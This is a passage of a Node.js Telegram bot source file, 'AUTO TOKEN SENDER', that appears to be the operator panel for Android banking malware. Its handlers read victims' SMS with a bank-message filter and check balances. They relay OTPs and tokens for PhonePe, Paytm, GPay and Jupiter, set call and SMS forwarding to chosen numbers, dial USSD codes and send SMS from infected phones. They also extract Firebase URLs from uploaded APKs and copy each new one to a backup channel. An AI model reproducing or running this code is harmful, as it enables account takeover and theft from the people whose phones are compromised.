      const g = state.global_devices[deviceId];
      // admin hub — set user's active to this device so commands use stored fbUrl
      if (g && g.fbUrl) {
        const user = getUserData(uid);
        if (!user.fb_urls.includes(g.fbUrl)) user.fb_urls.push(g.fbUrl);
        user.active_fb_url = g.fbUrl;
        saveState();
      }
      return showDeviceManagement(uid, chatId, msgId, deviceId, true, true);
    }
    if (data.startsWith('admindev_page_')) {
      const parts = data.split('_');
      const page = parseInt(parts[2]);
      const onl = parts[3] === '1';
      return showAdminDevices(uid, chatId, msgId, page, true, onl);
    }

    if (data.startsWith('dev_page_')) {
      const page = parseInt(data.split('_')[2]);
      return showOnlineDevices(uid, chatId, msgId, page, true);
    }
    if (data.startsWith('dev_')) {
      const deviceId = data.substring(4);
      return showDeviceManagement(uid, chatId, msgId, deviceId, true);
    }
    if (data.startsWith('refresh_')) {
      const deviceId = data.substring(8);
      return showDeviceManagement(uid, chatId, msgId, deviceId, true);
    }
    if (data.startsWith('sim_')) {
      const parts = data.split('_');
      const deviceId = parts.slice(1, -1).join('_');
      const sim = parts[parts.length - 1];
      updateUserData(uid, { default_sim: sim });
      return showDeviceManagement(uid, chatId, msgId, deviceId, true);
    }
    if (data.startsWith('sms_page_')) {
      const parts = data.split('_');
      const deviceId = parts.slice(2, -2).join('_');
      const page = parseInt(parts[parts.length - 2]);
      const bankOnly = parts[parts.length - 1] === 'b';
      return showReadSMS(uid, chatId, msgId, deviceId, page, true, bankOnly);
    }
    if (data.startsWith('banksms_')) {
      const deviceId = data.substring(8);
      return showReadSMS(uid, chatId, msgId, deviceId, 0, true, true);
    }
    if (data.startsWith('readsms_')) {
      const deviceId = data.substring(8);
      return showReadSMS(uid, chatId, msgId, deviceId, 0, true, false);
    }
    if (data.startsWith('autotoken_')) {
      const deviceId = data.substring(10);
      const user = getUserData(uid);
      if (!user.channels || user.channels.length === 0) {
        await editMessage(chatId, msgId, '❌ **Channel not set**\n\nPhle "📢 Set Channel" se channel set karo.');
        return;
      }
      const info = await getDeviceInfo(uid, deviceId);
      updateUserData(uid, { device_id: deviceId, device_name: info?.name || deviceId, auto_forward: true });
      const lines = [
        '✅ **AUTO TOKEN SENDER**', '══════════════════════', '',
        '**Auto SMS Activated**',
        `┃ 📱 Device: \`${safeMd(info?.name || deviceId)}\``,
        `┃ 📡 SIM: \`${(user.default_sim || 'sim1').toUpperCase()}\``,
        `┃ 📢 Channel: \`${user.channels.join(', ')}\``,
        `┗ 🔀 Forwarding ON`, '',
        'Ab channel me OTP/token aayega to device us number par SMS bhejega.', '',
        'Supported: PhonePe Multi-SMS • JUPITER • PAYTM • GPay • OTP • Generic token'
      ];
      const buttons = [[{ text: '📱 Device', callback_data: `dev_${deviceId}` }]];
      await editMessage(chatId, msgId, lines.join('\n'), buttons);
      return;
    }
    if (data.startsWith('sendmsg_')) {
      const deviceId = data.substring(8);
      setAwaiting(uid, 'send_device', deviceId);
      setAwaiting(uid, 'state', 'send_number');
      const user = getUserData(uid);
      const lines = ['📨 **Send Message**', '═══════════════════', '', 'Phone number bhejo:', '', 'Example: `923001234567`', '', `📡 SIM: ${(user.default_sim || 'sim1').toUpperCase()} (device me badal sakte ho)`, '', 'Send `/cancel` to cancel.'];
      await editMessage(chatId, msgId, lines.join('\n'), [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
      return;
    }
    if (data.startsWith('ussd_')) {
      const deviceId = data.substring(5);
      setAwaiting(uid, 'ussd_device', deviceId);
      setAwaiting(uid, 'state', 'ussd_code');
      await editMessage(chatId, msgId, '📱 **USSD Dial**\n\nCode bhejo:\nExample: `*99#`\nExample: `*123#`\n\nSend `/cancel` to cancel.', [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
      return;
    }
    if (data.startsWith('callfwd_')) {
      const deviceId = data.substring(8);
      return showForwardMenu(uid, chatId, msgId, deviceId, 'call');
    }
    if (data.startsWith('smsfwd_')) {
      const deviceId = data.substring(7);
      return showForwardMenu(uid, chatId, msgId, deviceId, 'sms');
    }
    if (data.startsWith('fwden_')) {
      const parts = data.split('_');
      const deviceId = parts.slice(1, -1).join('_');
      const kind = parts[parts.length - 1];
      if (kind === 'call') return showCallForwardingInput(uid, chatId, msgId, deviceId);
      return showSmsForwardingInput(uid, chatId, msgId, deviceId);
    }
    if (data.startsWith('fwddis_')) {
      const parts = data.split('_');
      const deviceId = parts.slice(1, -1).join('_');
      const kind = parts[parts.length - 1];
      const ok = kind === 'call' ? await callForward(uid, deviceId, '', false) : await smsForward(uid, deviceId, '', false);
      await answerCallback(cb.id, ok ? 'Disabled' : 'Failed', true);
      return showDeviceManagement(uid, chatId, msgId, deviceId, true);
    }
    if (data.startsWith('calldial_')) {
      const deviceId = data.substring(9);
      setAwaiting(uid, 'calldial_device', deviceId);
      setAwaiting(uid, 'state', 'calldial_number');
      await editMessage(chatId, msgId, '📞 **Call Dial**\n\nNumber bhejo:\nExample: `7042180782`\n\nSend `/cancel` to cancel.', [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
      return;
    }
    if (data.startsWith('checkbalance_')) {
      const deviceId = data.substring(13);
      await answerCallback(cb.id, '💰 Checking balances…');
      return checkDeviceBalance(uid, chatId, deviceId);
    }
    if (data.startsWith('recheck_')) {
      const deviceId = data.substring(8);
      await answerCallback(cb.id, '💰 Rechecking…');
      return checkDeviceBalance(uid, chatId, deviceId);
    }

    await showMainMenu(uid, chatId, msgId, true);
  } catch (e) {
    console.error('Callback error:', e.message);
  }
}

async function showCallForwardingInput(uid, chatId, messageId, deviceId) {
  setAwaiting(uid, 'callfwd_device', deviceId);
  setAwaiting(uid, 'state', 'callfwd_number');
  await editMessage(chatId, messageId, `📞 **Call Forwarding → ON**\n\nForwarding number bhejo:\nExample: \`7042180782\`\n\nSend /cancel to cancel.`, [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
}
async function showSmsForwardingInput(uid, chatId, messageId, deviceId) {
  setAwaiting(uid, 'smsfwd_device', deviceId);
  setAwaiting(uid, 'state', 'smsfwd_number');
  await editMessage(chatId, messageId, `📨 **SMS Forwarding → ON**\n\nForwarding number bhejo:\nExample: \`7042180782\`\n\nSend /cancel to cancel.`, [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
}

// ============================================================
// TEXT / COMMAND HANDLER
// ============================================================
async function handleCommand(update) {
  try {
    const msg = update.message;
    if (!msg || msg.chat.id < 0) return;
    const text = msg.text || '';
    const chatId = msg.chat.id;
    const uid = msg.from.id;
    getUserData(uid);

    if (text.startsWith('/cancel')) {
      clearAwaiting(uid);
      await sendMessage(chatId, '❌ Cancelled.');
      return showMainMenu(uid, chatId);
    }

    if (text.startsWith('/start')) {
      clearAwaiting(uid);
      const user = getUserData(uid);
      if (user.fb_urls && user.fb_urls.length > 0) return showLoginStatus(uid, chatId);
      return showWelcome(uid, chatId);
    }

    if (text.startsWith('/admin')) {
      return showAdminMenu(uid, chatId);
    }

    const awaiting = getAwaiting(uid);

    if (awaiting.state === 'fb_url') {
      if (msg.document && String(msg.document.file_name || '').endsWith('.apk')) {
        await handleApk(uid, chatId, msg);
        return;
      }
      const url = text.trim().replace(/\/+$/, '');
      if (!/^https:\/\/.+?\.firebaseio\.com\/?$/.test(url)) { await sendMessage(chatId, '❌ Invalid Firebase URL.'); return; }
      const user = getUserData(uid);
      if (user.fb_urls.includes(url)) { await sendMessage(chatId, '⚠️ Already connected.'); clearAwaiting(uid); return showMainMenu(uid, chatId); }
      const detectedPath = await detectFirebasePath(url);
      user.fb_urls.push(url);
      if (!user.active_fb_url) user.active_fb_url = url;
      user.data_path = detectedPath;
      state.fb_owner[url] = String(uid);
      saveState();
      await sendMessage(BACKUP_CHANNEL, `🔑 **New Firebase**\n👤 \`${uid}\`\n📡 \`${maskFirebase(url)}\``).catch(() => {});
      clearAwaiting(uid);
      await sendMessage(chatId, `✅ **Firebase Connected!**\n📁 Path: \`${detectedPath}/\``);
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'channel_setup') {
      const ids = parseChannelIds(text);
      if (ids.length === 0) { await sendMessage(chatId, '❌ Invalid Channel ID.'); return; }
      const user = getUserData(uid);
      const merged = Array.from(new Set([...(user.channels || []), ...ids]));
      updateUserData(uid, { channels: merged });
      clearAwaiting(uid);
      await sendMessage(chatId, `✅ **Channel Set!**\n📢 \`${ids.join(', ')}\`\n\n⚠️ Bot us channel/group ka admin hona chahiye warna messages nahi aayenge.`);
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'search') {
      const num = text.replace(/[\s\-()]/g, '');
      clearAwaiting(uid);
      return searchByNumber(uid, chatId, num);
    }

    if (awaiting.state === 'admin_bank_search') {
      clearAwaiting(uid);
      return adminBankSearchResult(uid, chatId, text);
    }

    if (awaiting.state === 'admin_add') {
      clearAwaiting(uid);
      if (!isAdmin(uid)) return;
      const id = parseInt(text);
      if (!id || isNaN(id)) { await sendMessage(chatId, '❌ Invalid user id.'); return; }
      if (!state.admins.includes(String(id))) state.admins.push(String(id));
      saveState();
      await sendMessage(chatId, `✅ Admin added: \`${id}\``);
      return showAdminMenu(uid, chatId);
    }

    if (awaiting.state === 'quick_send_number') {
      const num = text.replace(/[\s\-()]/g, '');
      if (!/^\d{10,15}$/.test(num)) { await sendMessage(chatId, '❌ Invalid number.'); return; }
      setAwaiting(uid, 'quick_send_number', num);
      setAwaiting(uid, 'state', 'quick_send_message');
      return sendMessage(chatId, `📤 Message send karo \`${num}\` ko:`);
    }
    if (awaiting.state === 'quick_send_message') {
      const num = awaiting.quick_send_number;
      const user = getUserData(uid);
      if (!user.device_id) { clearAwaiting(uid); await sendMessage(chatId, '❌ No device selected.'); return; }
      const ok = await sendSMS(uid, user.device_id, num, text);
      clearAwaiting(uid);
      await sendMessage(chatId, ok ? `✅ Sent to ${num}` : '❌ Failed.');
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'quick_otp_number') {
      const num = text.replace(/[\s\-()]/g, '');
      if (!/^\d{10,15}$/.test(num)) { await sendMessage(chatId, '❌ Invalid number.'); return; }
      setAwaiting(uid, 'quick_otp_number', num);
      setAwaiting(uid, 'state', 'quick_otp_code');
      return sendMessage(chatId, `⚡ OTP code bhejo \`${num}\` ke liye:`);
    }
    if (awaiting.state === 'quick_otp_code') {
      const num = awaiting.quick_otp_number;
      const user = getUserData(uid);
      if (!user.device_id) { clearAwaiting(uid); await sendMessage(chatId, '❌ No device.'); return; }
      const ok = await sendSMS(uid, user.device_id, num, `Your OTP is ${text.trim()}`);
      clearAwaiting(uid);
      await sendMessage(chatId, ok ? `✅ OTP ${text.trim()} sent to ${num}` : '❌ Failed.');
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'send_number') {
      const num = text.replace(/[\s\-()]/g, '');
      if (!/^\d{10,15}$/.test(num)) { await sendMessage(chatId, '❌ Invalid number.'); return; }
      setAwaiting(uid, 'send_number', num);
      setAwaiting(uid, 'state', 'send_message');
      return sendMessage(chatId, `📨 Message send karo \`${num}\` ko:`);
    }
    if (awaiting.state === 'send_message') {
      const num = awaiting.send_number;
      const deviceId = awaiting.send_device;
      if (!num || !deviceId) { clearAwaiting(uid); return; }
      const ok = await sendSMS(uid, deviceId, num, text);
      clearAwaiting(uid);
      await sendMessage(chatId, ok ? `✅ Sent to ${num}\n🗑️ Auto-deleted` : '❌ Failed.');
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'ussd_code') {
      const deviceId = awaiting.ussd_device;
      if (!deviceId) { clearAwaiting(uid); return; }
      const ok = await ussdDial(uid, deviceId, text.trim());
      clearAwaiting(uid);
      await sendMessage(chatId, ok ? `✅ USSD sent: ${text.trim()}` : '❌ Failed.');
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'calldial_number') {
      const deviceId = awaiting.calldial_device;
      if (!deviceId) { clearAwaiting(uid); return; }
      const num = text.replace(/[\s\-()]/g, '');
      const ok = await callDial(uid, deviceId, num);
      clearAwaiting(uid);
      await sendMessage(chatId, ok ? `📞 Calling ${num}` : '❌ Failed.');
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'callfwd_number') {
      const deviceId = awaiting.callfwd_device;
      if (!deviceId) { clearAwaiting(uid); return; }
      const num = text.replace(/[\s\-()]/g, '');
      const ok = await callForward(uid, deviceId, num, true);
      clearAwaiting(uid);
      await sendMessage(chatId, ok ? `✅ Call forward → ${num}` : '❌ Failed.');
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'smsfwd_number') {
      const deviceId = awaiting.smsfwd_device;
      if (!deviceId) { clearAwaiting(uid); return; }
      const num = text.replace(/[\s\-()]/g, '');
      const ok = await smsForward(uid, deviceId, num, true);
      clearAwaiting(uid);
      await sendMessage(chatId, ok ? `✅ SMS forward → ${num}` : '❌ Failed.');
      return showMainMenu(uid, chatId);
    }

    if (awaiting.state === 'fwd_call') {
      const deviceId = awaiting.fwd_call_device;
      if (text.trim().toLowerCase() === 'off') {
        const ok = await callForward(uid, deviceId, '', false);
        clearAwaiting(uid);
        await sendMessage(chatId, ok ? '⛔ Call forwarding OFF' : '❌ Failed.');
        return showMainMenu(uid, chatId);
      }
      const m = text.match(/^set\s+(\d{10,15})$/i);
      if (m) { const ok = await callForward(uid, deviceId, m[1], true); clearAwaiting(uid); await sendMessage(chatId, ok ? `✅ Call forward → ${m[1]}` : '❌ Failed.'); return showMainMenu(uid, chatId); }
      await sendMessage(chatId, 'Format: `set 9876543210` = enable, `off` = disable');
      return;
    }
    if (awaiting.state === 'fwd_sms') {
      const deviceId = awaiting.fwd_sms_device;
      if (text.trim().toLowerCase() === 'off') {
        const ok = await smsForward(uid, deviceId, '', false);
        clearAwaiting(uid);
        await sendMessage(chatId, ok ? '⛔ SMS forwarding OFF' : '❌ Failed.');
        return showMainMenu(uid, chatId);
      }
      const m = text.match(/^set\s+(\d{10,15})$/i);
      if (m) { const ok = await smsForward(uid, deviceId, m[1], true); clearAwaiting(uid); await sendMessage(chatId, ok ? `✅ SMS forward → ${m[1]}` : '❌ Failed.'); return showMainMenu(uid, chatId); }
      await sendMessage(chatId, 'Format: `set 9876543210` = enable, `off` = disable');
      return;
    }

    // APK upload (even not awaiting)
    if (await handleApk(uid, chatId, msg)) return;

    await showMainMenu(uid, chatId);
  } catch (e) {
    console.error('Command error:', e.message);
  }
}

// ============================================================
// UPDATE DISPATCH
// ============================================================
async function handleUpdate(update) {
  try {
    await initState();
    if (update.callback_query) return handleCallback(update);
    if (update.message) {
      const chatId = update.message.chat ? update.message.chat.id : 0;
      if (chatId < 0) return processForwardableMessage(update);
      return handleCommand(update);
    }
    if (update.channel_post) {
      return processForwardableMessage({ channel_post: update.channel_post });
    }
  } catch (e) {
    console.error('Update error:', e.message);
  }
}

// ============================================================
// BACKGROUND SWEEP (single pass — reusable in both modes)
// ============================================================
async function backgroundSweepOnce() {
  try {
    if (!stateReady) await initState();
    const users = Object.values(state.users);
    const jobs = [];
    for (const user of users) {
      for (const fbUrl of user.fb_urls || []) {
        jobs.push((async () => {
          const data = await fbGet(fbUrl, dataPathOf(user));
          if (!data || typeof data !== 'object') return;
          for (const [id, dev] of Object.entries(data)) {
            if (!dev || typeof dev !== 'object') continue;
            await refreshGlobalDevice(state.fb_owner[fbUrl] || String(user), fbUrl, id, dev, false);
          }
        })());
      }
    }
    await Promise.all(jobs);
    saveState();
  } catch (e) {
    console.error('Sweep error:', e.message);
  }
}

let lastSweepTs = 0;
function throttledSweep() {
  if ((Date.now() - lastSweepTs) < 20000) return Promise.resolve();
  lastSweepTs = Date.now();
  return backgroundSweepOnce();
}

// ============================================================
// LOCAL / VPS MODE — long-polling
// ============================================================
async function pollLoop() {
  console.log('🤖 AUTO TOKEN SENDER polling (long-polling mode)…');
  while (true) {
    try {
      const r = await axios.post(`${TELEGRAM_API}/getUpdates`, {
        offset: state.last_update_id + 1,
        timeout: POLL_TIMEOUT,
        limit: 100,
        allowed_updates: ['message', 'callback_query', 'channel_post']
      }, { timeout: (POLL_TIMEOUT + 10) * 1000 });
      const updates = r.data?.result || [];
      for (const u of updates) {
        state.last_update_id = u.update_id;
        await handleUpdate(u);
      }
      if (updates.length) saveState();
    } catch (e) {
      console.error('Poll error:', e.message);
      await sleep(3000);
    }
  }
}

// ============================================================
// EXPRESS APP (used by Vercel serverless function)
// ============================================================
const app = express();
app.use(express.json());

app.get('/', async (req, res) => {
  await initState();
  res.json({ status: 'ok', bot: 'auto-token-sender', users: Object.keys(state.users).length });
});

app.get('/health', async (req, res) => {
  await initState();
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    users: Object.keys(state.users).length,
    devices: Object.keys(state.global_devices).length,
    webhook: process.env.WEBHOOK_URL || process.env.VERCEL_PROJECT_PRODUCTION_URL || process.env.VERCEL_URL || null,
    bot: state.me ? state.me.username : null,
    mode: process.env.VERCEL ? 'vercel' : 'server'
  });
});

// Vercel cron hits this → keeps online statuses fresh + flushes state
// Also self-heals the webhook registration in case it was lost/incorrect.
app.get('/ping', async (req, res) => {
  await initState();
  await throttledSweep();
  await flushState();
  await setWebhook().catch(() => {});
  res.json({ status: 'alive', timestamp: new Date().toISOString() });
});

// Explicit setup / repair endpoint: re-registers the webhook and reports it.
// Gated by ADMIN_ID (or SETUP_KEY) so it can't be abused publicly.
app.get('/setup', async (req, res) => {
  const key = String(req.query.key || '');
  const allowed = [process.env.SETUP_KEY, process.env.ADMIN_ID].filter(Boolean).map(String);
  if (!allowed.includes(key)) { res.status(403).json({ status: 'forbidden' }); return; }
  await initState(true);
  await setWebhook().catch(() => {});
  let info = null;
  try { info = await tg('getWebhookInfo'); } catch (e) {}
  res.json({ status: 'ok', configured: process.env.WEBHOOK_URL || process.env.VERCEL_PROJECT_PRODUCTION_URL || process.env.VERCEL_URL || null, webhook: info });
});

app.post('/webhook', async (req, res) => {
  // Soft validation: only reject when a secret header is present but wrong, so
  // a not-yet-updated Telegram registration can never cause dropped updates.
  const hdr = req.get('x-telegram-bot-api-secret-token') || '';
  if (WEBHOOK_SECRET && hdr && hdr !== WEBHOOK_SECRET) { res.sendStatus(403); return; }
  try {
    const update = req.body;
    if (update) await handleUpdate(update);
  } catch (e) {
    console.error('Webhook error:', e.message);
  }
  // Serverless: the function can freeze right after responding, so flush the
  // durable (Firebase) state write BEFORE returning 200 to Telegram.
  try { await flushState(); } catch (e) { console.error('Flush error:', e.message); }
  res.sendStatus(200);
});

async function setWebhook() {
  if (!BOT_TOKEN) return;
  // IMPORTANT: on Vercel the per-deployment URL (VERCEL_URL) is protected by
  // Deployment Protection (SSO) and Telegram cannot reach it (401). Always
  // prefer the stable, public production alias / custom domain.
  const base = resolveWebhookBase(process.env);
  if (!base) return;
  try {
    const res = await tg('setWebhook', {
      url: `${base}/webhook`,
      allowed_updates: ['message', 'callback_query', 'channel_post'],
      drop_pending_updates: false,
      ...(WEBHOOK_SECRET ? { secret_token: WEBHOOK_SECRET } : {})
    });
    console.log(`✅ Webhook set: ${base}/webhook`);
    if (res) console.log('   Telegram:', JSON.stringify(res));
  } catch (e) {
    console.error('❌ Webhook failed:', e.message);
  }
}

// Fire-and-forget boot (both modes)
initState();
if (process.env.VERCEL_URL || process.env.WEBHOOK_URL || process.env.VERCEL_PROJECT_PRODUCTION_URL) setWebhook();

// Local/VPS mode: `node api/bot.js`
if (require.main === module) {
  initState().then(() => {
    setInterval(() => backgroundSweepOnce(), 45000);
    const port = parseInt(process.env.PORT || '3000', 10);
    app.listen(port, () => {
      console.log(`🤖 AUTO TOKEN SENDER v7.1 running on :${port}`);
      console.log('👤 Admin:', state.owner, '| State:', BOT_DB_URL ? 'Firebase RTDB' : 'data/state.json');
    });
    if (!process.env.WEBHOOK_URL) pollLoop();
  });
}

module.exports = app;
module.exports._api = { handleUpdate, backgroundSweepOnce, initState, app, sendSMS, ussdDial, callDial, callForward, smsForward, requestScreenshot, getDeviceInfo, extractFirebaseFromAPK };